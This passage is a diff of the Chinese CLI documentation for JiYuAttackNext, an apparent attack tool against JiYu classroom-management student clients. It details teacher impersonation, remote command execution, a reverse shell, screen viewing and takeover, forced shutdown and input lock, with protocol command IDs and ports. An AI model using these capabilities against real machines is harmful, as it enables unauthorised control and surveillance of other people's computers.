@@ -19,7 +19,7 @@ GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://git
 
 ## 大白话说明
 
-命令行模式就是把图形界面里的按钮换成参数：给一台或多台学生机发话、发指令、开关机，或者冒充教师端去看屏幕、操作鼠标键盘。参数看着多，常用的就几个：`-ip` 说发给谁，`-msg` 发文字，`-c` 发命令，`-e` 做开关机这类附带动作，`--` 开头的是教师端那边的高级功能。
+命令行模式就是把图形界面里的按钮换成命令：给一台或多台学生机发话、发指令、开关机，或者冒充教师端去看屏幕、操作鼠标键盘。命令照界面的分组来写——先写分组和页面，再写这个页面的参数，例如 `remote message` 是文本消息页、`teacher screen` 是屏幕画面页、`local info` 是本机信息页。常用的还是那几个：`-ip` 说发给谁，`-msg` 发文字，`-c` 发命令，`--reboot` / `--shutdown` 开关机，其余 `--` 开头的是这个页面自己的选项。
 
 ### 常见词的白话解释
 
@@ -35,51 +35,47 @@ GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://git
 | 拒绝 / 超时 | 对方端口没人接、地址不通，或者被防火墙拦了 |
 | `COMD` / `LCMD` | 下发应用命令的两条通道，`LCMD` 是精简版，没有超时与回执 |
 
-### 参数一句话版
+### 子命令一句话版
 
-| 参数 | 一句话说明 |
-| --- | --- |
-| `remote message` | 文本消息页：`-msg` 或 `--msg-file` 二选一 |
-| `-msg` / `--msg-file` | 给学生机弹一句话，太长自动拆条；`--msg-file` 是从文件读 |
-| `-c` | 让学生机执行一条命令行 |
-| `-l` / `-t` | 重复发几轮、每轮隔几秒 |
-| `-e r` / `-e s` | 让一批学生机重启 / 关机，可倒计时并在屏幕上留一句话 |
-| `-e l` | 让当前登录用户注销（来源项目没有，这里用远程命令 `shutdown /l` 实现） |
-| `-e g` | 查自己这台机器的 IP 和学生端端口 |
-| `-e break` / `-e continue` | 断掉 / 恢复学生端的网络 |
-| `--shell` / `-e nc` | 在学生机上开一个可以一直打字的命令行 |
-| `--file` | 把文件或文件夹丢到学生机桌面 |
-| `--run` / `--url` | 让学生机运行程序 / 打开网页或本地文件 |
-| `--kill` / `--kill-window` | 结束进程 / 只关窗口，都能填编号或名字 |
-| `--blackscreen` / `--unlock` | 黑屏（可锁键鼠、可显示文字、可自动恢复）/ 解除黑屏 |
-| `--rename` / `--lock-screen` / `--unlock-screen` / `--screen-password` | 改显示名 / 锁屏 / 解除锁屏 / 设置解锁密码 |
-| `--students` / `--announce` | 看班里有谁在线、配置如何 / 只发宣告看谁登录 |
-| `--preview` / `--all-preview` | 看一台机器的缩略图 / 一次看全班的缩略图 |
-| `--view` / `--control` | 看实时画面 / 顺便接管鼠标键盘（接管只能在图形界面里操作） |
-| `--chat` | 走教师会话发聊天文本，要求对方已登录 |
+| 分组 / 子命令 | 对应界面页面 | 一句话说明 |
+| --- | --- | --- |
+| `remote message` | 文本消息 | 给学生机弹一句话：`-msg` 或 `--msg-file` 二选一，`-l` / `-t` 管重复轮次与间隔 |
+| `remote command` | 远程命令 | 让学生机执行一条命令行（`-c`），不回显输出 |
+| `remote file` | 文件传送 | 把文件或文件夹丢到学生机桌面（`--file`） |
+| `remote device` | 设备操作 | `--reboot` 重启、`--shutdown` 关机、`--logoff` 注销；重启与关机可倒计时并留一句话 |
+| `remote shell` | 反弹终端 | 在学生机上开一个可以一直打字的命令行 |
+| `restriction student` | 启停学生端 | 按当前状态启动或结束本机极域学生端，腾出被独占的 4705 端口 |
+| `teacher appcmd` | 应用命令 | `--run` 运行程序、`--url` 打开网页或本地文件、`--kill` 结束进程、`--blackscreen` 黑屏、`--unlock` 解除黑屏、`--rename` / `--lock-screen` / `--unlock-screen` / `--screen-password` 改显示名与锁屏、`--exit-student` 退出学生端、`--close-apps` 关闭所有程序 |
+| `teacher students` | 学生信息 | 看班里有谁在线、配置如何、进程与窗口（`--seconds`）；`--all-preview` 一次看全班缩略图；`--serve` 常驻监听 |
+| `teacher screen` | 屏幕画面 | `--preview` 看一台的缩略图、`--view` 看实时画面、`--probe` 只探端口、加 `--control` 顺便接管键鼠 |
+| `teacher control` | 远程接管 | 直接打开接管窗口，键鼠只能在图形界面里操作 |
+| `teacher chat` | 聊天消息 | 走教师会话发一条聊天文本，要求对方已登录 |
+| `teacher closewindow` | 关闭窗口 | 按句柄或标题只关窗口，不杀进程 |
+| `local info` | 本机信息 | 查自己这台机器的 IP 和学生端端口 |
+| `local firewall` | 防火墙 | `block` 断掉学生端网络、`allow` 恢复 |
 
 ### 三个常见疑问
 
-**为什么 `--mouse`、`--key`、`--view-stop`、`--control-stop` 会打开图形界面？**
-鼠标和键盘事件必须跟着一个正在显示的画面窗口发出去，命令行没有这样的窗口；而“停止观看”“解除接管”的报文里必须带上当初建立连接的那个本机端口号，进程一退出端口就没了，再发也不起作用。所以这四个参数的做法是打开对应页面，在窗口里关掉，这样报文才有效。
+**为什么 `teacher control` 会打开图形界面？**
+鼠标和键盘事件必须跟着一个正在显示的画面窗口发出去，命令行没有这样的窗口；而“停止观看”“解除接管”的报文里必须带上当初建立连接的那个本机端口号，进程一退出端口就没了，再发也不起作用。所以这条子命令的做法是打开接管页面，在窗口里操作、关窗时自动解除，这样报文才有效。
 
 **为什么有的命令要等几秒？**
-`--students`、`--announce`、`--all-preview` 要先喊一嗓子（宣告）等学生机报到，再逐个去问，等待时间就是参数里的秒数。机器越多、网络越慢，就需要给得越大。
+`teacher students`、`--serve`、`--all-preview` 要先喊一嗓子（宣告）等学生机报到，再逐个去问，等待时间就是参数里的秒数。机器越多、网络越慢，就需要给得越大。
 
 **为什么显示“已送达”但对方没反应？**
 这条判断只看网络：端口有没有人接、主机在不在线。学生机收下了报文但没执行（比如它没开对应功能、版本不同、频道不对），命令行是看不到的。要确认执行结果只能看目标屏幕。
 
 ### 命令从哪来
 
-命令行里的参数大多对应两个来源项目：
+命令按界面分组，功能大多对应两个来源项目：
 
-| 来源 | 对应参数 |
+| 来源 | 对应功能 |
 | --- | --- |
-| `Jiyu_udp_attack` | `-ip`、`-p`、`-msg`、`-c`、`-l`、`-t`、`-e r`、`-e s`、`-e g`、`-e break`、`-e continue`、`-e nc` |
-| `Third-party-JiYu-Teacher-Endpoint` | `--run`、`--url`、`--kill`、`--blackscreen`、`--unlock`、`--exit-student`、`--close-apps`、`--announce`、`--students`、`--preview`、`--all-preview`、`--view`、`--control`、`--probe`、`--chat`、`--kill-window` |
-| 本程序新增 | `-e l`（注销）、`--file`（文件传送）、`--msg-file`、`--power-*`、`--no-auto-unlock`、`--rename`、`--lock-screen`、`--unlock-screen`、`--screen-password`、`--lcmd`、`--report`、`--shell`、`--peer` |
+| `Jiyu_udp_attack` | 文本消息（`remote message`）、远程命令（`remote command`）、重启与关机（`remote device`）、本机信息（`local info`）、防火墙规则（`local firewall`）的报文结构 |
+| `Third-party-JiYu-Teacher-Endpoint` | 应用命令（`teacher appcmd`）、学生信息与缩略图（`teacher students`）、屏幕画面与接管（`teacher screen`、`teacher control`）、聊天（`teacher chat`）、关闭窗口（`teacher closewindow`）的报文结构 |
+| 本程序新增 | 注销（`remote device --logoff`）、文件传送（`remote file`）、反弹终端（`remote shell`）、启停学生端（`restriction student`）、全员缩略图、黑屏自动解除、`LCMD` 轻量通道、端口占用提示 |
 
-来源的 `-e r` / `-e s` 只是重发一份固定模板，本程序改走应用命令，因此多了倒计时和提示文字；来源的 `-e nc` 依赖外网脚本与 `powercat`，本程序的 `--shell` 自己起脚本服务。
+来源的 `-e r` / `-e s` 只是重发一份固定模板，本程序改走应用命令，因此多了倒计时和提示文字；来源的 `-e nc` 依赖外网脚本与 `powercat`，本程序的 `remote shell` 自己起脚本服务。
 
 <br>
 
@@ -124,21 +120,21 @@ Windows 10/11。EXE 已包含 Python 运行时，命令行模式无需安装 Pyt
 通用格式：
 
 ```text
-JiYuAttackNext.exe -ip <目标地址> [-p <目标端口>] <功能参数>
+JiYuAttackNext.exe <分组> <子命令> [-ip <目标地址>] [-p <目标端口>] <该页面的参数>
 ```
 
-发送报文需要指定 `-ip`，默认 UDP 端口为 `4705`；本机功能 `-e g`、`-e break`、`-e continue` 不需要目标地址。无参数启动会打开 GUI，带 `-h`、`--version` 或其他参数时运行 CLI；GUI 的启动与操作见 [GUI 模式使用说明](GUI.md)。
+先写分组与子命令，再跟这个页面的参数。`-ip` 只有需要目标的功能才要求，默认 UDP 端口为 `4705`；`local info`、`local firewall`、`restriction student` 与 `teacher students` 的宣告模式都不需要目标地址。无参数启动会打开 GUI，带 `-h`、`--version` 或其他参数时运行 CLI；GUI 的启动与操作见 [GUI 模式使用说明](GUI.md)。
 
 在命令提示符（cmd）中可直接运行：
 
 ```bat
-JiYuAttackNext.exe -ip 10.49.151.29 -msg "Hello"
+JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
 ```
 
 EXE 是窗口化程序，双击无参数启动只打开 GUI，不会创建控制台窗口。从终端带参数启动时，程序把输出写回当前终端，不会另开控制台窗口；由于它不占用控制台，提示符会立即返回，需要等命令执行完再继续时用 `start /wait`：
 
 ```bat
-start /wait JiYuAttackNext.exe -ip 10.49.151.29 -msg "Hello"
+start /wait JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
 ```
 
 重定向输出（`> 结果.txt`）与管道仍然有效。
@@ -180,110 +176,189 @@ start /wait JiYuAttackNext.exe -ip 10.49.151.29 -msg "Hello"
 
 ## 参数参考
 
-### 通用参数
+参数按子命令分组：先写 `<分组> <子命令>`，再跟这个页面自己的参数。`-h` 只列出当前子命令支持的参数，所以不记得某个页面能做什么时，直接看它自己的帮助即可。
+
+### 所有子命令通用的部分
 
 | 参数 | 类型 | 默认值 | 用途与说明 |
 | --- | --- | --- | --- |
-| `-h` / `--help` | 开关 | 无 | 显示帮助并退出 |
+| `-h` / `--help` | 开关 | 无 | 显示当前子命令的帮助并退出 |
 | `-V` / `--version` | 开关 | 无 | 显示版本号并退出（测试版末尾带提交哈希） |
-| `-ip` | 字符串 | 无 | 目标地址，支持单个 IPv4、同网段末段范围及 `/24` |
-| `-p` | 整数 | `4705` | 目标 UDP 端口 |
-| `-msg` | 字符串 | 无 | 发送文本消息，保留多行内容；超长文本自动分条 |
-| `--msg-file` | 路径 | 无 | 从 UTF-8 文件读取消息；`-` 表示标准输入；与 `-msg` 互斥 |
-| `--file` | 路径 | 无 | 传送一个或多个文件、文件夹到目标电脑桌面，文件夹按原结构递归；与 `-msg`、`--msg-file`、`-c` 和 `-e` 互斥 |
-| `--file-ip` | IPv4 | 自动检测 | 文件传送时写入命令的本机 IPv4；多网卡或自动检测异常时手动指定 |
-| `--file-timeout` | 秒 | `120` | 等待每个目标下载文件的秒数，须大于 0 |
-| `-c` | 字符串 | 无 | 发送待执行的命令 |
-| `-l` | 整数 | `1` | 发送轮数；每轮遍历全部目标与报文 |
-| `-t` | 整数 | `22` | 轮次之间的等待秒数，仅多轮发送时生效 |
-| `-e` | 枚举 | 无 | 扩展功能，取值见下表 |
+| `-ip` | 字符串 | 无 | 目标地址，支持单个 IPv4、同网段末段范围及 `/24`；只有需要目标的子命令才要求 |
+| `-p` | 整数 | `4705` | 目标 UDP 端口；`teacher students` 里它是本机监听端口 |
+| `--channel N` | 整数 | `1` | 会话频道号，取值 1–32；黑屏、解锁与宣告都按该频道寻址 |
+| `--teacher-name NAME` | 字符串 | `1` | 宣告里携带的教师名，也是学生端屏幕上显示的名称 |
+| `--peer IP` | 地址 | — | 额外直接宣告的对端地址，可重复；用于组播被过滤的场景 |
 
-### 扩展功能
+`--channel`、`--teacher-name`、`--peer` 只出现在与教师端会话相关的子命令里：`teacher appcmd`、`teacher students`、`teacher screen`、`teacher control`、`teacher chat`、`teacher closewindow`。
 
-`-e` 是“顺带做一件额外的事”：开关机、查本机、断网恢复，以及反弹终端。它需要和 `-ip` 搭配（`-e g`、`-e break`、`-e continue` 只管本机，不需要 `-ip`）。
-
-| 参数组合 | 功能 | 执行范围 | 条件与说明 |
-| --- | --- | --- | --- |
-| `-e r` | 重启目标电脑 | 目标设备 | 需要指定 `-ip`；走应用命令 cmdId `0x13`，支持 `--power-delay`、`--power-text`、`--power-no-force` |
-| `-e s` | 关闭目标电脑 | 目标设备 | 需要指定 `-ip`；走应用命令 cmdId `0x14`，支持 `--power-delay`、`--power-text`、`--power-no-force` |
-| `-e l` | 注销当前登录用户 | 目标设备 | 需要指定 `-ip`；通过远程命令通道执行 `shutdown /l`，依赖目标允许执行远程命令 |
-| `-e g` | 查询本机 IP 与学生端可能的监听端口 | 本机 | 尝试匹配 `Student` 相关进程及端口；不需要 `-ip` |
-| `--file PATH [PATH ...]` | 文件与文件夹传送到目标桌面 | 本机与目标设备 | 需要 `-ip`；可以一次给多个路径，文件夹按原结构递归展开；按目标逐个启动本机 HTTP 文件服务并发送 cmd/curl 下载命令，等待下载完成 |
-| `-e break` | 尝试阻断学生端网络连接 | 本机 | 修改 Windows 防火墙设置及名为 `StudentMain.exe` 的现有规则，需要管理员权限；未提升时按需弹出 UAC |
-| `-e continue` | 将学生端防火墙规则改为允许 | 本机 | 修改名为 `StudentMain.exe` 的现有规则，需要管理员权限；未提升时按需弹出 UAC；不还原全部防火墙设置 |
-| `-e nc` | 与 `--shell` 相同的反弹终端 | 本机与目标设备 | 需要指定 `-ip`；建立监听与本机脚本服务，再把下载并回连的命令发到目标 |
-
-`-e break` 和 `-e continue` 会修改本机防火墙。EXE 默认以普通用户权限启动，普通命令直接在当前终端执行；只有这两项操作在未提升时会弹出 UAC，由隐藏的管理员助手完成修改后返回结果，不会另开一个显示输出的终端窗口。
-
-### 应用命令与教师端模拟
-
-一句话：这组参数是冒充老师跟学生端说话——看班里有哪些机器、看屏幕、发教师专用指令。它们彼此互斥，也不能与 `-msg`、`--msg-file`、`-c`、`--file`、`-e` 同时使用；`-ip` 展开后的每个地址都会收到同一条命令。
+### remote message（文本消息）
 
 | 参数 | 类型 | 默认值 | 用途与说明 |
 | --- | --- | --- | --- |
-| `--run PATH` | 路径 | 无 | 在目标电脑上运行指定程序（应用命令 cmdId `0x0F`） |
-| `--run-args TEXT` | 字符串 | 空 | `--run` 的启动参数 |
+| `-msg TEXT` | 字符串 | 无 | 发送文本消息，保留多行内容；超长文本自动分条 |
+| `--msg-file PATH` | 路径 | 无 | 从 UTF-8 文件读取消息；`-` 表示标准输入；与 `-msg` 互斥 |
+| `-l N` | 整数 | `1` | 发送轮数；每轮遍历全部目标与报文 |
+| `-t N` | 整数 | `22` | 轮次之间的等待秒数，仅多轮发送时生效 |
+
+### remote command（远程命令）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `-c TEXT` | 字符串 | 无 | 发送待执行的命令，单条最多 163 个 UTF-16 单元 |
+
+命令走 `-c` 报文通道，目标是否执行、输出到哪里都由学生端决定；要看实时回显请用 `remote shell`。
+
+### remote file（文件传送）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `--file PATH [PATH ...]` | 路径 | 无 | 传送一个或多个文件、文件夹到目标桌面，文件夹按原结构递归 |
+| `--file-ip ADDRESS` | IPv4 | 自动检测 | 写入下载命令的本机 IPv4；多网卡或自动检测异常时手动指定 |
+| `--file-timeout SECONDS` | 秒 | `120` | 等待每个目标下载完成的秒数，须大于 0 |
+
+### remote device（设备操作）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `--reboot` | 开关 | — | 重启目标电脑，走应用命令 cmdId `0x13` |
+| `--shutdown` | 开关 | — | 关闭目标电脑，走应用命令 cmdId `0x14` |
+| `--logoff` | 开关 | — | 注销目标当前登录用户，通过远程命令执行 `shutdown /l` |
+| `--power-delay SECONDS` | 整数 | `0` | 关机或重启的倒计时秒数，`0` 立即执行 |
+| `--power-text TEXT` | 字符串 | 空 | 倒计时期间显示的提示文字 |
+| `--power-no-force` | 开关 | 关 | 不加强制标志：等待程序自行退出，而不是强制关闭 |
+
+三个动作互斥，必须选一个。重启与关机走应用命令通道，倒计时、提示文字与强制标志都在报文里，由学生端自己执行并显示倒计时；注销没有独立的极域报文，走远程命令通道，也没有倒计时。
+
+### remote shell（反弹终端）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `--shell-port PORT` | 整数 | `0` | 本机终端监听端口，`0` 表示随机；脚本服务端口同样随机 |
+| `--shell-ip ADDRESS` | 地址 | 自动 | 目标回连时使用的本机地址，留空时按目标地址自动挑选出口地址 |
+
+子命令本身就会启动反弹终端：先在本机起一个 TCP 终端监听和一个只提供启动脚本的临时 HTTP 服务，再通过远程命令让目标下载脚本并连回来，连上后逐条输入命令。连接命令要挤进单条远程命令的 163 个 UTF-16 单元里，因此本机地址与端口都由程序自己挑选。目标是窗口化的 EXE 时，程序会把标准输入重新绑定到控制台，交互与在源码里运行一致。
+
+### restriction student（启停学生端）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| （不带参数） | — | — | 按当前状态切换：有学生端在运行就结束，没有就启动 |
+| `--list` | 开关 | 关 | 只列出进程号、进程名、占用端口与程序路径，不做任何改动 |
+| `--start` | 开关 | 关 | 强制启动学生端，路径留空时自动查找 |
+| `--exe PATH` | 路径 | 无 | 配合 `--start` 指定主程序的完整路径 |
+| `--pid PID` | 整数 | 无 | 只结束指定进程，可重复 |
+
+### teacher appcmd（应用命令）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `--run PATH` | 路径 | 无 | 在目标电脑上运行指定程序（cmdId `0x0F`） |
+| `--run-args TEXT` | 字符串 | 空 | `--run` 的启动参数；参数本身以 `-` 开头时写成 `--run-args=--silent`，否则终端会把它当成新的选项 |
 | `--run-show MODE` | `0`/`1`/`2` | `0` | `--run` 的窗口状态：正常、最小化、最大化 |
-| `--url URL` | 字符串 | 无 | 在目标电脑上打开网址或本地路径（cmdId `0x18`）；网址缺协议时按 `http://` 补全，`C:\...`、UNC 路径与含 `://` 的地址原样下发 |
-| `--kill PID\|NAME` | 字符串 | 无 | 结束目标电脑上的进程：纯数字按进程号走 MESS 上报请求，其余按进程名在已发现的学生信息里匹配后逐个下发 |
-| `--blackscreen [SECONDS]` | 整数 | `10` | 让目标黑屏并显示提示文字；`SECONDS` 为 `0` 表示不自动解除；黑屏走会话频道组播 |
-| `--no-lock` | 开关 | 关 | `--blackscreen` 只黑屏，不锁定键盘与鼠标 |
-| `--no-auto-unlock` | 开关 | 关 | 发送黑屏后不在本机等待并补发解锁，改为手动 `--unlock` |
+| `--url URL` | 字符串 | 无 | 打开网址或本地路径（cmdId `0x18`）；缺协议时补 `http://`，`C:` 开头、UNC 与含 `://` 的地址原样下发 |
+| `--kill PID\|NAME` | 字符串 | 无 | 结束进程：纯数字按进程号走 MESS 上报，其余按进程名在已发现的学生信息里匹配后逐个下发 |
+| `--blackscreen [SECONDS]` | 整数 | `10` | 让目标黑屏并显示提示文字；`0` 表示不自动解除；走会话频道组播 |
+| `--no-lock` | 开关 | 关 | 只黑屏，不锁定键盘与鼠标 |
+| `--no-auto-unlock` | 开关 | 关 | 发送后不在本机等待并补发解锁，改为手动 `--unlock` |
 | `--blackout-text TEXT` | 字符串 | 空 | 黑屏期间显示的提示文字 |
 | `--unlock` | 开关 | 无 | 解除黑屏与键鼠锁，走会话频道组播 |
-| `--exit-student` | 开关 | 无 | 让目标电脑退出学生端（cmdId `0x15`） |
-| `--close-apps` | 开关 | 无 | 关闭目标电脑上的所有程序（cmdId `0x02`） |
 | `--rename NAME` | 字符串 | — | 修改目标电脑上显示的计算机名（cmdId `0x05`） |
 | `--lock-screen` | 开关 | — | 锁定目标电脑的屏幕（cmdId `0x0A`，状态 `1`） |
 | `--unlock-screen` | 开关 | — | 解除目标电脑的锁屏（cmdId `0x0A`，状态 `0`） |
 | `--screen-password PASSWORD` | 字符串 | — | 设置锁屏的解锁密码（cmdId `0x0B`）；传空字符串表示清除 |
+| `--exit-student` | 开关 | 无 | 让目标电脑退出学生端（cmdId `0x15`） |
+| `--close-apps` | 开关 | 无 | 关闭目标电脑上的所有程序（cmdId `0x02`） |
 | `--lcmd` | 开关 | 关 | 应用命令改走轻量通道 `LCMD`：不带 20000 毫秒超时与事务号，学生端也不回事务应答 |
-| `--channel N` | 整数 | `1` | 会话频道号，取值 1–32；黑屏、解锁与宣告都按该频道寻址 |
-| `--teacher-name NAME` | 字符串 | `1` | 宣告里携带的教师名，也是学生端屏幕上显示的名称 |
-| `--announce [SECONDS]` | 整数 | `10` | 以教师端模拟身份发送在线宣告并监听登录，超时后打印发现的路由信息 |
-| `--students [SECONDS]` | 整数 | `8` | 发现学生机后拉取并打印其系统信息、进程与窗口 |
-| `--report KIND` | 整数 | `0` | `--students` 请求的上报类型：`0` 全部、`1` 窗口、`2` 进程 |
-| `--serve [SECONDS]` | 整数 | — | 常驻教师端：持续宣告并实时打印登录的学生；填秒数则到点退出，`0` 表示一直运行到 Ctrl+C |
-| `--preview [SECONDS]` | 整数 | `8` | 向目标请求一帧屏幕缩略图并保存到 `--output-dir` |
-| `--all-preview [SECONDS]` | 整数 | `8` | 先宣告发现全部学生，再逐个拉缩略图；不给 `-ip` 也能用，等价于来源项目的 `all` |
-| `--view [SECONDS]` | 整数 | `15` | 连上目标 `--tcp-port` 连续接收桌面画面，按帧保存 |
-| `--control` | 开关 | 关 | 与 `--view` 配合，先申请接管键鼠再观看；单独使用会打开图形界面的“远程接管”页 |
-| `--tcp-port PORT` | 整数 | `4806` | 屏幕观看使用的学生端 TCP 端口 |
-| `--output-dir DIR` | 路径 | `preview` | 缩略图与画面帧的保存目录，不存在时自动创建 |
-| `--chat TEXT` | 文本 | — | 走教师会话聊天通道发送文本，目标需先登录教师会话 |
-| `--kill-window HWND\|TITLE` | 字符串 | — | 按窗口句柄（十进制或 `0x`）或标题关键字让目标关闭窗口，进程继续运行 |
-| `--probe` | 开关 | 关 | 只探测目标 `--tcp-port` 是否可连，不发送任何请求 |
-| `--peer IP` | 地址 | — | 额外直接宣告的对端地址，可重复；用于组播被过滤的场景 |
-| `--mouse` | 开关 | 关 | 鼠标点击与移动只能靠图形界面发送，使用该参数会打开“远程接管”页 |
-| `--key` | 开关 | 关 | 键盘输入只能靠图形界面发送，使用该参数会打开“远程接管”页 |
-| `--view-stop` | 开关 | 关 | 停止观看在图形界面的“屏幕画面”页里操作，使用该参数会打开该页面 |
-| `--control-stop` | 开关 | 关 | 解除接管在图形界面的“远程接管”页里操作，使用该参数会打开该页面 |
+
+除 `--lcmd` 外，这些动作互斥，一次只能选一个。
 
 `--blackscreen` 与 `--unlock` 必须让 `--channel` 与学生端所在频道一致：这两条报文只在会话组播上被处理，单播不生效。锁键鼠的解除不能靠再发一次黑屏并把锁参数去掉，学生端只把 `lock_input=1` 当作上锁。
 
 黑屏除报文里的 `timeout` 字段外，本机也会按秒数排一个定时解除：发送成功后等待 `SECONDS` 秒并自动补发解锁报文，中途按 `Ctrl+C` 会立即解除。`SECONDS` 为 `0`、或显式加 `--no-auto-unlock` 时，黑屏会一直保持，需要时用 `--unlock` 手动解除。
 
-修改显示名、锁屏开关与解锁密码这三条命令号（`0x05`、`0x0A`、`0x0B`）只在来源项目的协议说明里出现，脚本本身没有实现，报文按同一套 `[cmdId][保留或状态][UTF-16LE 文本]` 布局拼装。它们和其余应用命令一样默认走 `COMD`，加 `--lcmd` 改为轻量通道：报文头用 `LCMD` 魔数、没有 20000 毫秒超时与事务号，因此也不会有事务应答。
+修改显示名、锁屏开关与解锁密码这三条命令号（`0x05`、`0x0A`、`0x0B`）只在来源项目的协议说明里出现，学生端脚本本身没有实现，报文按同一套 `[cmdId][保留或状态][UTF-16LE 文本]` 布局拼装。它们和其余应用命令一样默认走 `COMD`，加 `--lcmd` 改为轻量通道：报文头用 `LCMD` 魔数、没有 20000 毫秒超时与事务号，因此也不会有事务应答。
 
-### 关机与重启
-
-| 参数 | 类型 | 默认值 | 用途与说明 |
-| --- | --- | --- | --- |
-| `--power-delay SECONDS` | 整数 | `0` | 关机或重启的倒计时秒数，`0` 立即执行；学生端会在倒计时里显示提示文字 |
-| `--power-text TEXT` | 字符串 | 空 | 关机或重启倒计时期间显示的提示文字 |
-| `--power-no-force` | 开关 | 关 | 不加强制标志：等待程序自行退出，而不是强制关闭 |
-
-`-e r` 与 `-e s` 走应用命令通道（cmdId `0x13` / `0x14`），因此能带上倒计时、提示文字与强制标志；`-e l` 没有对应命令号，仍通过远程命令通道执行 `shutdown /l`。
-
-### 反弹终端
+### teacher students（学生信息）
 
 | 参数 | 类型 | 默认值 | 用途与说明 |
 | --- | --- | --- | --- |
-| `--shell` | 开关 | 关 | 启动反弹终端：本机监听 + 临时脚本服务，再把连接命令发到 `-ip` |
-| `--shell-port PORT` | 整数 | `0` | 本机终端监听端口，`0` 表示随机；脚本服务端口同样随机 |
-| `--shell-ip ADDRESS` | 地址 | 自动 | 目标回连时使用的本机地址，留空时按目标地址自动挑选出口地址 |
+| `--seconds [SECONDS]` | 整数 | `8` | 宣告并监听登录的秒数 |
+| `--all-preview [SECONDS]` | 整数 | `8` | 先发现全部学生，再逐个拉缩略图；不给 `-ip` 也能用 |
+| `--kill PID\|NAME` | 字符串 | 无 | 对已发现的学生按进程号或进程名结束进程 |
+| `--report KIND` | 整数 | `0` | 请求的上报类型：`0` 全部、`1` 窗口、`2` 进程 |
+| `--serve [SECONDS]` | 整数 | — | 常驻教师端：持续宣告并实时显示登录的学生；填秒数到点退出，`0` 表示运行到 Ctrl+C |
 
-`--shell` 与 `-e nc` 等价：先在本机起一个 TCP 终端监听和一个只提供启动脚本的临时 HTTP 服务，再通过远程命令让目标下载脚本并连回来，连上后即可逐条输入命令。连接命令要挤进单条远程命令的 163 个 UTF-16 单元里，因此本机地址与端口都由程序自己挑选。目标是窗口化的 EXE 时，程序会把标准输入重新绑定到控制台，交互与在源码里运行一致；`--shell` 无法与 `-msg`、`-c` 等其他发送参数同时使用。
+`-ip` 在这里是可选的：不给时靠组播与广播找学生，给 `--peer` 则直接向指定地址宣告。
+
+### teacher screen（屏幕画面）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `--preview [SECONDS]` | 整数 | `8` | 向目标请求一帧屏幕缩略图并保存到 `--output-dir` |
+| `--view [SECONDS]` | 整数 | `15` | 连上 `--tcp-port` 连续接收桌面画面，按帧保存 |
+| `--probe` | 开关 | 关 | 只探测目标 `--tcp-port` 是否可连，不发送任何请求 |
+| `--stop` | 开关 | 关 | 结束观看在图形界面的“屏幕画面”页里操作，加它会打开该页面 |
+| `--control` | 开关 | 关 | 配合 `--view` 先申请接管键鼠再观看；单独使用会打开“远程接管”页 |
+| `--tcp-port PORT` | 整数 | `4806` | 屏幕传输使用的学生端 TCP 端口 |
+| `--output-dir DIR` | 路径 | `preview` | 缩略图与画面帧的保存目录，不存在时自动创建 |
+
+四个动作（`--preview`、`--view`、`--probe`、`--stop`）互斥，必须选一个。
+
+### teacher control（远程接管）
+
+没有额外参数，`-ip` 与 `--channel` 指定目标与频道。接管要持续转发键鼠事件，命令行没有输入循环，因此解析后直接打开图形界面的“远程接管”页并开始接管，等同于界面上的那个按钮。
+
+### teacher chat（聊天消息）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `TEXT` | 位置参数 | 无 | 要发送的聊天内容 |
+
+先按 `--channel` 宣告一轮并等待登录，再单播 MESS 类型 `0x800` 的文本；目标没有登录教师会话时直接报错。
+
+### teacher closewindow（关闭窗口）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `HWND\|TITLE` | 位置参数 | 无 | 窗口句柄（十进制或 `0x` 开头）直接下发；填标题关键字则先拉窗口列表再匹配 |
+
+只关窗口，不结束进程。填标题时会先发现学生、取回窗口列表，再在本地按标题匹配（先精确、后子串）。
+
+### local info（本机信息）
+
+没有额外参数：打印本机 IPv4 与 `Student` 相关进程可能监听的端口，等价于早期的 `-e g`。只查运行命令的本机，不发任何报文。
+
+### local firewall（防火墙）
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `block` / `allow` | 位置参数 | 无 | `block` 阻断学生端连接，`allow` 把规则改回允许 |
+
+`block` 会启动 `MpsSvc`、打开全部配置文件的防火墙，并把名为 `StudentMain.exe` 的规则改成阻断；`allow` 只把该规则改回允许，不还原其他防火墙设置。两项都需要管理员权限，未提升时弹出 UAC，由隐藏的管理员助手完成后回传结果。
+
+### 旧的扁平写法
+
+早期与来源项目的写法（`-ip ... -msg ...`、`--run ...`）仍然可用，与子命令解析出的字段相同：
+
+| 扁平写法 | 等价子命令 |
+| --- | --- |
+| `-msg`、`--msg-file`、`-l`、`-t` | `remote message` |
+| `-c` | `remote command` |
+| `--file`、`--file-ip`、`--file-timeout` | `remote file` |
+| `-e r` / `-e s` / `-e l` | `remote device --reboot` / `--shutdown` / `--logoff` |
+| `--shell`、`-e nc`、`--shell-port`、`--shell-ip` | `remote shell` |
+| `-e g` | `local info` |
+| `-e break` / `-e continue` | `local firewall block` / `allow` |
+| `--run`、`--url`、`--blackscreen`、`--unlock`、`--exit-student` 等 | `teacher appcmd` |
+| `--students`、`--announce`、`--serve`、`--all-preview`、`--report` | `teacher students` |
+| `--preview`、`--view`、`--probe`、`--view-stop` | `teacher screen` |
+| `--chat TEXT` | `teacher chat ... TEXT` |
+| `--kill-window HWND` | `teacher closewindow ... HWND` |
+| `--mouse`、`--key`、`--control-stop` | `teacher control` |
+| `--end-student`、`--end-student-pid`、`--list-student`、`--start-student`、`--student-exe` | `restriction student` |
+
